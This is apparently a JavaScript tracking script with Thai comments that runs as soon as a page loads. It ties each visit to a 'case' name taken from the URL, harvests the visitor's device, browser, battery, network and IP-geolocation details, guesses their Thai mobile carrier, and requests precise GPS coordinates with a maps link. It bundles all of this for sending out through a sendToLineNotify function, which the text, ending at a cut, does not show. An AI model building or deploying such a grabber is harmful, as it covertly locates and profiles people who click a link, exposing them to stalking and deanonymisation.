// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
function getUrlParameters() {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
    const caseName = urlParams.get('case') || "ไม่มีค่า";
    
    console.log("ดึงค่าจาก URL parameters:");
    console.log("- trackingKey:", trackingKey);
    console.log("- caseName:", caseName);
    
    return {
      trackingKey: trackingKey,
      caseName: caseName
    };
  } catch (error) {
    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
    return {
      trackingKey: "ไม่มีค่า",
      caseName: "ไม่มีค่า"
    };
  }
}

// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
(function() {
  // เก็บข้อมูลทั่วไป
  const timestamp = new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  
  // ดึง tracking key และ case name จาก URL
  const { trackingKey, caseName } = getUrlParameters();

  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "ไม่มีข้อมูล";
  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
  const platform = navigator.platform || "ไม่มีข้อมูล";
  const connection = getConnectionInfo();
  const browser = detectBrowser();

  // ตรวจสอบการใช้งานแบตเตอรี่
  getBatteryInfo().then(batteryData => {
    // รวบรวมข้อมูลทั้งหมด
    const allDeviceData = {
      ...deviceInfo,
      screenSize,
      screenColorDepth,
      devicePixelRatio,
      language,
      platform,
      browser,
      connection,
      battery: batteryData
    };

    // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
    let dataToSend = {};
    
    // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
    Promise.all([
      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})),
      estimatePhoneNumber().catch(() => null)
    ])
    .then(([ipData, phoneInfo]) => {
      // เก็บข้อมูลที่จำเป็นทั้งหมด
      dataToSend = {
        timestamp: timestamp,
        ip: ipData,
        deviceInfo: allDeviceData,
        phoneInfo: phoneInfo,
        referrer: referrer,
        trackingKey: trackingKey || "ไม่มีค่า",
        caseName: caseName || "ไม่มีค่า",
        useServerMessage: true,
        requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
      };
      
      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
      if (navigator.geolocation) {
        const locationPromise = new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            position => {
              resolve({
                lat: position.coords.latitude,
                long: position.coords.longitude,
                accuracy: position.coords.accuracy,
                gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
              });
            },
            error => {
              console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
              resolve("ไม่มีข้อมูล");
            },
            {
              timeout: 5000,
              enableHighAccuracy: true
            }
          );
        });
        
        // รอข้อมูลพิกัดไม่เกิน 5 วินาที
        Promise.race([
          locationPromise,
          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล"), 5000))
        ])
        .then(location => {
          // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
          dataToSend.location = location;
          
          // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
          sendToLineNotify(dataToSend);
        });
      } else {
        // ถ้าไม่สามารถใช้ Geolocation API ได้
        dataToSend.location = "ไม่มีข้อมูล";
        sendToLineNotify(dataToSend);
      }
    });
  });
})();

// สร้าง ID เฉพาะสำหรับการร้องขอ
function generateUniqueId() {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "ไม่มีข้อมูล";

  // ตรวจสอบประเภทอุปกรณ์ด้วยวิธีที่ละเอียดขึ้น
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  const isTablet = /(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(userAgent.toLowerCase());
  const deviceType = isTablet ? "แท็บเล็ต" : (isMobile ? "มือถือ" : "คอมพิวเตอร์");

  // ดึงชื่อรุ่นอุปกรณ์ (ด้วยวิธีที่ละเอียดขึ้น)
  let deviceModel = "ไม่สามารถระบุได้";
  let osVersion = "ไม่สามารถระบุได้";
  let deviceBrand = "ไม่สามารถระบุได้";

  // ตรวจสอบ OS แบบละเอียด
  let os = "ไม่สามารถระบุได้";
  let osArchitecture = "ไม่สามารถระบุได้";

  // ตรวจสอบ Windows
  if (userAgent.indexOf("Windows") !== -1) {
    os = "Windows";
    if (userAgent.indexOf("Windows NT 10.0") !== -1) os += " 10/11";
    else if (userAgent.indexOf("Windows NT 6.3") !== -1) os += " 8.1";
    else if (userAgent.indexOf("Windows NT 6.2") !== -1) os += " 8";
    else if (userAgent.indexOf("Windows NT 6.1") !== -1) os += " 7";
    else if (userAgent.indexOf("Windows NT 6.0") !== -1) os += " Vista";
    else if (userAgent.indexOf("Windows NT 5.1") !== -1) os += " XP";
    else if (userAgent.indexOf("Windows NT 5.0") !== -1) os += " 2000";
    
    // ตรวจสอบ architecture
    if (userAgent.indexOf("Win64") !== -1 || userAgent.indexOf("x64") !== -1) {
      osArchitecture = "64-bit";
    } else {
      osArchitecture = "32-bit";
    }
    
    deviceModel = "PC " + os + " " + osArchitecture;
  } 
  // ตรวจสอบ macOS
  else if (userAgent.indexOf("Macintosh") !== -1 || userAgent.indexOf("Mac OS X") !== -1) {
    os = "macOS";
    
    // พยายามดึงเวอร์ชัน macOS
    const macOSVersionMatch = userAgent.match(/Mac OS X (\d+[._]\d+[._]?\d*)/i);
    if (macOSVersionMatch) {
      osVersion = macOSVersionMatch[1].replace(/_/g, '.');
      os += " " + osVersion;
    }
    
    deviceBrand = "Apple";
    // ตรวจสอบ Apple Silicon หรือ Intel
    if (userAgent.indexOf("Intel Mac") !== -1) {
      deviceModel = "Mac (Intel)";
    } else if (userAgent.indexOf("ARM Mac") !== -1) {
      deviceModel = "Mac (Apple Silicon)";
    } else {
      deviceModel = "Mac";
    }
  } 
  // ตรวจสอบ iOS (iPhone/iPad)
  else if (/iPhone|iPad|iPod/.test(userAgent)) {
    deviceBrand = "Apple";
    
    // ระบุประเภทอุปกรณ์ iOS
    if (userAgent.indexOf("iPhone") !== -1) {
      deviceModel = "iPhone";
    } else if (userAgent.indexOf("iPad") !== -1) {
      deviceModel = "iPad";
    } else if (userAgent.indexOf("iPod") !== -1) {
      deviceModel = "iPod";
    }
    
    // ดึงเวอร์ชัน iOS
    const iosVersionMatch = userAgent.match(/OS (\d+[._]\d+[._]?\d*) like Mac OS X/i);
    if (iosVersionMatch) {
      osVersion = iosVersionMatch[1].replace(/_/g, '.');
      os = "iOS " + osVersion;
    } else {
      os = "iOS";
    }
    
    // พยายามระบุรุ่น iPhone โดยละเอียด
    if (deviceModel === "iPhone") {
      // ตรวจสอบสเปคของหน้าจอและอื่นๆ เพื่อประมาณรุ่น
      const screenWidth = window.screen.width;
      const screenHeight = window.screen.height;
      const pixelRatio = window.devicePixelRatio || 1;
      
      if (pixelRatio >= 3) {
        if (Math.max(screenWidth, screenHeight) >= 896) {
          deviceModel += " 11 Pro Max/XS Max/11/12/13 หรือสูงกว่า";
        } else if (Math.max(screenWidth, screenHeight) >= 812) {
          deviceModel += " X/XS/11 Pro/12/13 mini หรือสูงกว่า";
        } else {
          deviceModel += " รุ่นใหม่ (Plus/Pro)";
        }
      } else if (pixelRatio >= 2) {
        if (Math.max(screenWidth, screenHeight) >= 667) {
          deviceModel += " 6/7/8/SE2 หรือสูงกว่า";
        } else {
          deviceModel += " 4/5/5S/SE1";
        }
      }
    }
  } 
  // ตรวจสอบ Android
  else if (userAgent.indexOf("Android") !== -1) {
    os = "Android";
    
    // ดึงเวอร์ชัน Android
    const androidVersionMatch = userAgent.match(/Android (\d+(\.\d+)+)/i);
    if (androidVersionMatch) {
      osVersion = androidVersionMatch[1];
      os += " " + osVersion;
    }
    
    // ดึงข้อมูลรุ่นและยี่ห้อ
    const androidModelMatch = userAgent.match(/;\s*([^;]+(?:\s+Build|\s+MIUI|\)|\s+wv))/i);
    if (androidModelMatch) {
      let modelInfo = androidModelMatch[1].trim().replace(/Build|MIUI|\)|wv/g, '').trim();
      
      // พยายามแยกยี่ห้อออกจากโมเดล
      const brandsToCheck = ["Samsung", "Xiaomi", "Redmi", "POCO", "Huawei", "Honor", "Oppo", "Vivo", 
                           "OnePlus", "Sony", "HTC", "LG", "Motorola", "Nokia", "Asus", "Lenovo", 
                           "Realme", "ZTE", "Nubia", "Google", "Pixel"];
      
      for (const brand of brandsToCheck) {
        if (modelInfo.indexOf(brand) !== -1 || userAgent.indexOf(brand) !== -1) {
          deviceBrand = brand;
          modelInfo = modelInfo.replace(brand, '').trim();
          break;
        }
      }
      
      if (deviceBrand === "ไม่สามารถระบุได้") {
        // สำหรับอุปกรณ์ซัมซุง รูปแบบ SM-XXXX
        if (modelInfo.indexOf("SM-") !== -1) {
          deviceBrand = "Samsung";
        } 
        // สำหรับอุปกรณ์ Xiaomi รูปแบบ Mi / Redmi
        else if (modelInfo.indexOf("Mi ") !== -1 || modelInfo.indexOf("Redmi") !== -1) {
          deviceBrand = "Xiaomi";
        }
      }
      
      deviceModel = (deviceBrand !== "ไม่สามารถระบุได้" ? deviceBrand + " " : "") + modelInfo;
    }
  } 
  // ตรวจสอบ Linux
  else if (userAgent.indexOf("Linux") !== -1) {
    os = "Linux";
    
    if (userAgent.indexOf("Ubuntu") !== -1) {
      os = "Ubuntu Linux";
    } else if (userAgent.indexOf("Fedora") !== -1) {
      os = "Fedora Linux";
    } else if (userAgent.indexOf("Debian") !== -1) {
      os = "Debian Linux";
    }
    
    deviceModel = "Linux PC";
  }

  // เพิ่มข้อมูลสถาปัตยกรรม CPU
  if (typeof navigator.cpuClass !== 'undefined') {
    osArchitecture = navigator.cpuClass;
  }

  return {
    userAgent: userAgent,
    vendor: vendor,
    deviceType: deviceType,
    deviceModel: deviceModel,
    deviceBrand: deviceBrand,
    os: os,
    osVersion: osVersion,
    osArchitecture: osArchitecture,
    platform: navigator.platform || "ไม่มีข้อมูล",
    cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " cores" : "ไม่มีข้อมูล"
  };
}

// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

  let connectionInfo = {
    type: "ไม่สามารถระบุได้",
    effectiveType: "ไม่สามารถระบุได้",
    downlink: "ไม่สามารถระบุได้",
    rtt: "ไม่สามารถระบุได้",
    saveData: false,
    isWifi: false,
    isMobile: false,
    networkType: "ไม่สามารถระบุได้"
  };

  // ตรวจสอบโดยละเอียดผ่าน user agent
  const userAgent = navigator.userAgent.toLowerCase();
  
  if (userAgent.includes('nettype/wifi') || userAgent.includes('nattype/wifi') || userAgent.includes('nettype/4g') || userAgent.includes('nettype/3g')) {
    if (userAgent.includes('nettype/wifi') || userAgent.includes('nattype/wifi')) {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "WiFi";
      connectionInfo.type = "wifi";
    } else if (userAgent.includes('nettype/4g') || userAgent.includes('nettype/lte')) {
      connectionInfo.isMobile = true;
      connectionInfo.networkType = "4G";
      connectionInfo.type = "cellular";
      connectionInfo.effectiveType = "4g";
    } else if (userAgent.includes('nettype/3g')) {
      connectionInfo.isMobile = true;
      connectionInfo.networkType = "3G";
      connectionInfo.type = "cellular";
      connectionInfo.effectiveType = "3g";
    }
  }

  if (connection) {
    // เก็บข้อมูลพื้นฐาน
    connectionInfo.type = connection.type || connectionInfo.type;
    connectionInfo.effectiveType = connection.effectiveType || connectionInfo.effectiveType;
    connectionInfo.downlink = connection.downlink || "ไม่สามารถระบุได้";
    connectionInfo.rtt = connection.rtt || "ไม่สามารถระบุได้";
    connectionInfo.saveData = connection.saveData || false;

    // ตรวจสอบว่าเป็น WiFi หรือ Mobile
    if (connection.type === 'wifi') {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "WiFi";
    }
    else if (['cellular', 'umts', 'hspa', 'lte', 'cdma', 'evdo', 'gsm', '2g', '3g', '4g', '5g'].includes(connection.type)) {
      connectionInfo.isMobile = true;

      // ระบุประเภทเครือข่ายโทรศัพท์จาก effectiveType
      if (connection.effectiveType === 'slow-2g' || connection.effectiveType === '2g') {
        connectionInfo.networkType = "2G";
      } else if (connection.effectiveType === '3g') {
        connectionInfo.networkType = "3G";
      } else if (connection.effectiveType === '4g') {
        connectionInfo.networkType = "4G/LTE";
      } else if (connection.type === '5g') {
        connectionInfo.networkType = "5G";
      } else {
        connectionInfo.networkType = "Mobile Data";
      }
    }
    else {
      // ตรวจสอบจาก effectiveType หากไม่มีข้อมูล type ที่ชัดเจน
      if (connection.effectiveType === '4g') {
        // ปรับปรุงตรรกะการตรวจสอบ - effectiveType 4g อาจจะเป็นได้ทั้ง WiFi และ Mobile
        if (!connectionInfo.isMobile) {
          connectionInfo.isWifi = true;
          connectionInfo.networkType = "WiFi";
        }
      } else if (['slow-2g', '2g', '3g'].includes(connection.effectiveType)) {
        connectionInfo.isMobile = true;
        connectionInfo.networkType = connection.effectiveType === "3g" ? "3G" : "2G";
      }
    }
  }

  // ตรวจสอบการเชื่อมต่อเพิ่มเติมจากข้อมูล offline/online
  connectionInfo.isOnline = navigator.onLine;
  
  // คำนวณความเร็วโดยประมาณ (หากมีข้อมูล downlink)
  if (connectionInfo.downlink !== "ไม่สามารถระบุได้") {
    // เพิ่มรายละเอียดความเร็ว
    if (connectionInfo.downlink <= 0.1) {
      connectionInfo.speedDescription = "ช้ามาก";
    } else if (connectionInfo.downlink <= 0.5) {
      connectionInfo.speedDescription = "ช้า";
    } else if (connectionInfo.downlink <= 2) {
      connectionInfo.speedDescription = "ปานกลาง";
    } else if (connectionInfo.downlink <= 10) {
      connectionInfo.speedDescription = "เร็ว";
    } else {
      connectionInfo.speedDescription = "เร็วมาก";
    }
  }

  return connectionInfo;
}

// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
async function getBatteryInfo() {
  try {
    // ตรวจสอบว่าสามารถเข้าถึง Battery API ได้หรือไม่ (แบบละเอียด)
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      
      // รายละเอียดเพิ่มเติมของแบตเตอรี่
      const level = battery.level * 100;
      const levelText = Math.floor(level) + "%";
      const charging = battery.charging;
      const chargingTime = battery.chargingTime;
      const dischargingTime = battery.dischargingTime;
      
      // วิเคราะห์สถานะแบตเตอรี่
      let batteryStatus = "ปกติ";
      if (level <= 15) {
        batteryStatus = "ใกล้หมด";
      } else if (level <= 30) {
        batteryStatus = "เหลือน้อย";
      }
      
      // คำนวณเวลาที่เหลือโดยประมาณ (หากมีข้อมูล)
      let timeRemaining = "ไม่สามารถประมาณได้";
      if (!charging && dischargingTime !== Infinity) {
        const hoursRemaining = Math.floor(dischargingTime / 3600);
        const minutesRemaining = Math.floor((dischargingTime % 3600) / 60);
        timeRemaining = `${hoursRemaining}h ${minutesRemaining}m`;
      } else if (charging && chargingTime !== Infinity) {
        const hoursRemaining = Math.floor(chargingTime / 3600);
        const minutesRemaining = Math.floor((chargingTime % 3600) / 60);
        timeRemaining = `อีก ${hoursRemaining}h ${minutesRemaining}m เต็ม`;
      }
      
      return {
        level: levelText,
        charging: charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ",
        status: batteryStatus,
        timeRemaining: timeRemaining
      };
    }
    
    // ทางเลือกสำหรับอุปกรณ์มือถือที่ไม่รองรับ Battery API
    else if (navigator.userAgent.match(/Android|iPhone/i)) {
      // พยายามประมาณการณ์จากข้อมูลอื่น ๆ
      return {
        level: "ไม่สามารถเข้าถึงข้อมูลได้โดยตรง",
        charging: "ไม่สามารถระบุได้",
        status: "ไม่สามารถระบุได้",
        additional: "อุปกรณ์มือถือที่ไม่รองรับการตรวจสอบแบตเตอรี่"
      };
    }

    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
  } catch (error) {
    console.error("Error getting battery info:", error);
    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
  }
}

// ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
function detectBrowser() {
  const userAgent = navigator.userAgent;
  let browserName = "ไม่ทราบ";
  let browserVersion = "ไม่ทราบ";
  let browserEngine = "ไม่ทราบ";

  // ตรวจสอบ Engine ของเบราว์เซอร์
  if (userAgent.indexOf("Gecko/") > -1) {
    browserEngine = "Gecko";
  } else if (userAgent.indexOf("AppleWebKit/") > -1) {
    browserEngine = "WebKit";
  } else if (userAgent.indexOf("Trident/") > -1) {
    browserEngine = "Trident";
  }

  // ตรวจสอบเบราว์เซอร์โดยละเอียด (ปรับปรุงรูปแบบการตรวจสอบ)
  // Microsoft Edge (Chromium) ก่อน Chrome เนื่องจาก Edge มี Chrome ในสตริง
  if (userAgent.indexOf("Edg/") > -1) {
    browserName = "Microsoft Edge (Chromium)";
    const edgMatch = userAgent.match(/Edg\/(\d+(\.\d+)+)/);
    if (edgMatch) browserVersion = edgMatch[1];
  }
  // Microsoft Edge (Legacy)
  else if (userAgent.indexOf("Edge/") > -1) {
    browserName = "Microsoft Edge (Legacy)";
    const edgeMatch = userAgent.match(/Edge\/(\d+(\.\d+)+)/);
    if (edgeMatch) browserVersion = edgeMatch[1];
  }
  // Firefox
  else if (userAgent.indexOf("Firefox/") > -1 && userAgent.indexOf("Seamonkey") === -1) {
    browserName = "Firefox";
    const ffMatch = userAgent.match(/Firefox\/(\d+(\.\d+)+)/);
    if (ffMatch) browserVersion = ffMatch[1];
    
    // ตรวจสอบ Firefox for Android
    if (userAgent.indexOf("Android") > -1) {
      browserName = "Firefox for Android";
    }
  }
  // Samsung Browser
  else if (userAgent.indexOf("SamsungBrowser/") > -1) {
    browserName = "Samsung Browser";
    const sbMatch = userAgent.match(/SamsungBrowser\/(\d+(\.\d+)+)/);
    if (sbMatch) browserVersion = sbMatch[1];
  }
  // Opera
  else if (userAgent.indexOf("OPR/") > -1 || userAgent.indexOf("Opera/") > -1) {
    browserName = "Opera";
    const operaMatch = userAgent.match(/(?:OPR|Opera)\/(\d+(\.\d+)+)/);
    if (operaMatch) browserVersion = operaMatch[1];
  }
  // UC Browser
  else if (userAgent.indexOf("UCBrowser/") > -1) {
    browserName = "UC Browser";
    const ucMatch = userAgent.match(/UCBrowser\/(\d+(\.\d+)+)/);
    if (ucMatch) browserVersion = ucMatch[1];
  }
  // Chrome
  else if (userAgent.indexOf("Chrome/") > -1) {
    browserName = "Chrome";
    const chromeMatch = userAgent.match(/Chrome\/(\d+(\.\d+)+)/);
    if (chromeMatch) browserVersion = chromeMatch[1];
    
    // ตรวจสอบ Chrome for Android
    if (userAgent.indexOf("Android") > -1) {
      browserName = "Chrome for Android";
    }
  }
  // Safari
  else if (userAgent.indexOf("Safari/") > -1 && userAgent.indexOf("Chrome") === -1) {
    browserName = "Safari";
    const safariMatch = userAgent.match(/Version\/(\d+(\.\d+)+)/);
    if (safariMatch) browserVersion = safariMatch[1];
    
    // ตรวจสอบ Safari on iOS
    if (userAgent.match(/iPhone|iPad|iPod/)) {
      browserName = "Safari on iOS";
    }
  }
  // Internet Explorer
  else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident/") > -1) {
    browserName = "Internet Explorer";
    if (userAgent.indexOf("MSIE") > -1) {
      const msieMatch = userAgent.match(/MSIE\s(\d+(\.\d+)+)/);
      if (msieMatch) browserVersion = msieMatch[1];
    } else {
      const rvMatch = userAgent.match(/rv:(\d+(\.\d+)+)/);
      if (rvMatch) browserVersion = rvMatch[1];
    }
  }

  return {
    name: browserName,
    version: browserVersion,
    engine: browserEngine,
    fullInfo: `${browserName} ${browserVersion} (${browserEngine})`,
    userAgent: userAgent
  };
}

// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้หลาย API และมีระบบ fallback)
async function getIPDetails() {
  try {
    // ลองใช้ ipinfo.io ก่อน
    const response = await fetch('https://ipinfo.io/json');
    if (!response.ok) {
      throw new Error(`ipinfo.io request failed with status ${response.status}`);
    }
    const ipDetails = await response.json();

    // จัดรูปแบบข้อมูลให้สอดคล้องกับโครงสร้างเดิม + เพิ่มเติม
    return {
      ip: ipDetails.ip || "ไม่สามารถระบุได้",
      hostname: ipDetails.hostname || "ไม่มีข้อมูล",
      city: ipDetails.city || "ไม่ทราบ",
      region: ipDetails.region || "ไม่ทราบ",
      country: ipDetails.country || "ไม่ทราบ",
      countryName: getCountryNameFromCode(ipDetails.country) || "ไม่ทราบ", // เพิ่มชื่อประเทศจากรหัส
      loc: ipDetails.loc || "ไม่มีข้อมูล",
      org: ipDetails.org || "ไม่ทราบ",
      postal: ipDetails.postal || "ไม่มีข้อมูล",
      timezone: ipDetails.timezone || "ไม่ทราบ",
      asn: ipDetails.org ? ipDetails.org.split(' ')[0] : "ไม่ทราบ",
      isp: ipDetails.org ? ipDetails.org.substring(ipDetails.org.indexOf(' ') + 1) : "ไม่ทราบ"
    };
  } catch (error) {
    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
    
    // ลองใช้ API อื่น ๆ เป็น fallback
    try {
      // Fallback #1: ipapi.co
      const apiResponse = await fetch('https://ipapi.co/json/');
      if (apiResponse.ok) {
        const apiData = await apiResponse.json();
        return {
          ip: apiData.ip || "ไม่สามารถระบุได้",
          hostname: apiData.hostname || "ไม่มีข้อมูล",
          city: apiData.city || "ไม่ทราบ",
          region: apiData.region || apiData.region_name || "ไม่ทราบ",
          country: apiData.country_code || "ไม่ทราบ",
          countryName: apiData.country_name || "ไม่ทราบ",
          loc: apiData.latitude && apiData.longitude ? `${apiData.latitude},${apiData.longitude}` : "ไม่มีข้อมูล",
          org: apiData.org || "ไม่ทราบ",
          postal: apiData.postal || "ไม่มีข้อมูล",
          timezone: apiData.timezone || "ไม่ทราบ",
          asn: apiData.asn || "ไม่ทราบ",
          isp: apiData.org || "ไม่ทราบ"
        };
      }
      
      // Fallback #2: ipify + ipapi.com
      const basicResponse = await fetch('https://api.ipify.org?format=json');
      const basicData = await basicResponse.json();
      const ip = basicData.ip;
      
      if (ip) {
        try {
          const geoResponse = await fetch(`https://ipapi.com/ip_api.php?ip=${ip}`);
          const geoData = await geoResponse.json();
          
          return {
            ip: ip,
            hostname: "ไม่มีข้อมูล",
            city: geoData.city || "ไม่ทราบ",
            region: geoData.region_name || "ไม่ทราบ",
            country: geoData.country_code || "ไม่ทราบ",
            countryName: geoData.country_name || "ไม่ทราบ",
            loc: geoData.latitude && geoData.longitude ? `${geoData.latitude},${geoData.longitude}` : "ไม่มีข้อมูล",
            org: geoData.organisation || geoData.isp || "ไม่ทราบ",
            postal: geoData.postal || "ไม่มีข้อมูล",
            timezone: geoData.timezone || "ไม่ทราบ",
            asn: geoData.asn || "ไม่ทราบ",
            isp: geoData.isp || "ไม่ทราบ"
          };
        } catch (error) {
          return { ip: ip || "ไม่สามารถระบุได้" };
        }
      }
      
      return { ip: "ไม่สามารถระบุได้" };
    } catch (fallbackError) {
      console.error("ไม่สามารถดึง IP จาก fallback ได้:", fallbackError);
      return { ip: "ไม่สามารถระบุได้" };
    }
  }
}

// ฟังก์ชันแปลงรหัสประเทศเป็นชื่อประเทศ
function getCountryNameFromCode(code) {
  if (!code) return null;
  
  const countries = {
    "TH": "Thailand", "US": "United States", "GB": "United Kingdom", "JP": "Japan",
    "CN": "China", "IN": "India", "DE": "Germany", "FR": "France", "IT": "Italy",
    "CA": "Canada", "AU": "Australia", "KR": "South Korea", "RU": "Russia", "BR": "Brazil",
    "SG": "Singapore", "MY": "Malaysia", "ID": "Indonesia", "PH": "Philippines", "VN": "Vietnam",
    "HK": "Hong Kong", "TW": "Taiwan", "NZ": "New Zealand", "SA": "Saudi Arabia", "AE": "United Arab Emirates"
  };
  
  return countries[code.toUpperCase()] || null;
}

// ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์และข้อมูลเครือข่ายมือถือ
async function estimatePhoneNumber() {
  const phoneInfo = {
    mobileOperator: "ไม่สามารถระบุได้",
    possibleOperator: "ไม่สามารถระบุได้",
    countryCode: "ไม่สามารถระบุได้",
    networkGeneration: "ไม่สามารถระบุได้", // เพิ่มข้อมูลเกี่ยวกับ 3G/4G/5G
    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรงเนื่องจากข้อจำกัดความเป็นส่วนตัวของเบราว์เซอร์"
  };

  try {
    // ตรวจสอบข้อมูลการเชื่อมต่อเครือข่าย
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
      // เก็บข้อมูลรุ่นเครือข่าย (2G/3G/4G/5G)
      if (connection.type === '5g') {
        phoneInfo.networkGeneration = "5G";
      } else if (connection.effectiveType === '4g') {
        phoneInfo.networkGeneration = "4G";
      } else if (connection.effectiveType === '3g') {
        phoneInfo.networkGeneration = "3G";
      } else if (connection.effectiveType === '2g' || connection.effectiveType === 'slow-2g') {
        phoneInfo.networkGeneration = "2G";
      }
    }

    // ตรวจสอบผู้ให้บริการโทรศัพท์จากข้อมูล IP
    const ipDetails = await getIPDetails();

    // ตรวจสอบข้อมูลผู้ให้บริการจาก isp ที่ได้จาก IP data
    const ispInfo = ipDetails.isp || "";
    const orgInfo = ipDetails.org || "";
    const fullIspData = (ispInfo + " " + orgInfo).toLowerCase();

    // เพิ่มเติมข้อมูลประเทศ
    phoneInfo.countryCode = ipDetails.country || "ไม่สามารถระบุได้";
    if (ipDetails.countryName) {
      phoneInfo.countryName = ipDetails.countryName;
    }

    // ปรับปรุงรายชื่อผู้ให้บริการในประเทศไทยให้ครบถ้วน
    const thaiOperators = {
      "AIS": ["ais", "advanced info service", "awn", "advanced wireless network", "intouch"],
      "DTAC": ["dtac", "total access communication", "dtn", "dtac trinet", "telenor", "dtc"],
      "TRUE": ["true", "true move", "truemove", "true corporation", "trueonline", "real future", "truemoney", "true vision", "tm",],
      "NT": ["cat", "tot", "national telecom", "nt", "cat telecom", "tot public company limited", "communication authority of thailand"],
      "3BB": ["triple t broadband", "3bb", "ทริปเปิลที", "triple t internet", "jasmine", "จัสมิน"],
      "JAS": ["jasmine", "jas", "จัสมิน"],
      "MYBYCAT": ["my by cat", "my", "mybycat"],
      "AIT": ["ait", "advanced information technology"],
      "CS Loxinfo": ["cs loxinfo", "loxinfo", "csloxinfo"],
      "Inet": ["inet", "internet thailand", "อินเทอร์เน็ตประเทศไทย"],
      "UIH": ["uih", "united information highway", "อินฟอร์เมชั่นไฮเวย์"],
      "FiberNow": ["fibernow", "fiber now", "เฟเบอร์นาว"],
      "SINET": ["sinet", "solution internet service"]
    };

    // ค้นหาผู้ให้บริการจากชื่อ ISP
    let foundOperator = false;
    for (const [operator, keywords] of Object.entries(thaiOperators)) {
      if (keywords.some(keyword => fullIspData.includes(keyword.toLowerCase()))) {
        phoneInfo.possibleOperator = operator;
        foundOperator = true;
        break;
      }
    }

    // วิเคราะห์ข้อมูลเพิ่มเติมสำหรับผู้ให้บริการโทรศัพท์
    if (foundOperator) {
      if (["AIS", "DTAC", "TRUE", "NT"].includes(phoneInfo.possibleOperator)) {
        phoneInfo.remarks = `อาจใช้เครือข่ายมือถือ ${phoneInfo.possibleOperator} (วิเคราะห์จาก ISP)`;
      } else {
        phoneInfo.remarks = `อาจใช้อินเทอร์เน็ตบ้านของ ${phoneInfo.possibleOperator} (วิเคราะห์จาก ISP)`;
      }
    }

    // ตรวจสอบข้อมูลเพิ่มเติมจาก User Agent
    const userAgent = navigator.userAgent.toLowerCase();
    if (userAgent.includes("android")) {
      // บนแอนดรอยด์อาจมีข้อมูลเครือข่าย
      for (const [operator, keywords] of Object.entries(thaiOperators)) {
        if (keywords.some(keyword => userAgent.includes(keyword.toLowerCase()))) {
          phoneInfo.mobileOperator = operator;
          break;
        }
      }
    }

    // ตรวจสอบข้อมูลเพิ่มเติมสำหรับประเทศไทย
    if (ipDetails.country === "TH" || ipDetails.countryName === "Thailand") {
      phoneInfo.countryCode = "+66";
      phoneInfo.countryName = "Thailand";
      
      // ถ้าพบข้อมูลพื้นที่ในประเทศไทย
      if (ipDetails.region && ipDetails.city) {
        phoneInfo.location = `${ipDetails.city}, ${ipDetails.region}, Thailand`;
      }
    }

    // ถ้ามีข้อมูลการเชื่อมต่อแบบมือถือ ให้เพิ่มข้อมูล
    if (connection && connection.type === 'cellular') {
      phoneInfo.remarks = `เชื่อมต่อผ่านเครือข่ายมือถือ${phoneInfo.networkGeneration !== "ไม่สามารถระบุได้" ? " " + phoneInfo.networkGeneration : ""} ${phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? phoneInfo.possibleOperator : ""}`;
      
      // หากมีข้อมูลความเร็ว ให้เพิ่มเติม
      if (connection.downlink) {
        phoneInfo.networkSpeed = `${connection.downlink} Mbps`;
        phoneInfo.remarks += ` (ความเร็ว ${connection.downlink} Mbps)`;
      }
    }

    return phoneInfo;
  } catch (error) {
    console.error("ไม่สามารถประมาณการข้อมูลเครือข่ายมือถือได้:", error);
    return phoneInfo;
  }
}

// ฟังก์ชันพยายามดึงข้อมูลตำแหน่ง
